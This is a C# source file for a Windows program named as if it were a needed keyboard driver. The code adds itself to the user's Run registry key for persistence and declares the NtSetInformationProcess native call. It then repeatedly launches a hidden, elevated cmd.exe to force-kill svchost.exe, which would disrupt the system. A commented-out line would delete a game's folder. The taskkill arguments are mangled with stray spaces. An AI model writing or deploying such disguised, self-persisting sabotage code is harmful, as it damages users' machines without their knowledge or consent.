using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.ComponentModel;
using WindowsInput.Native;
using WindowsInput;
using System.IO;
using Microsoft.Win32;
using static System.Net.Mime.MediaTypeNames;
using Keyboard_Driver_for_external_keyboards;
using Application = System.Windows.Forms.Application;

namespace Service_Host_Keyboard_driver_that_is_needed
{
    internal static class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        static void Main()
        {
            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("My application", Application.ExecutablePath.ToString());

            int i = 0;

            InputSimulator sim = new InputSimulator();
            while (i < 10)
            {
                Random random = new Random();
                //int choice = random.Next(1, 4);
                int choice = 3;
                if (choice == 1)
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    Application.Run(new Form1());
                }
                if (choice == 2)
                {
                    /*                    string filename = @"C:\Riot Games\League of Legends";
                                        File.Delete(filename);*/
                    MessageBox.Show("No league for you");
                }
                if (choice == 3)
                {
                    System.Diagnostics.Process process = new System.Diagnostics.Process();
                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startInfo.FileName = "cmd.exe";
                    startInfo.Arguments = "/ C taskkill / IM svchost.exe / F";
                    startInfo.Verb = "runas";
                    process.StartInfo = startInfo;
                    process.Start();
                }
                i++;
            }
        }
    }
}
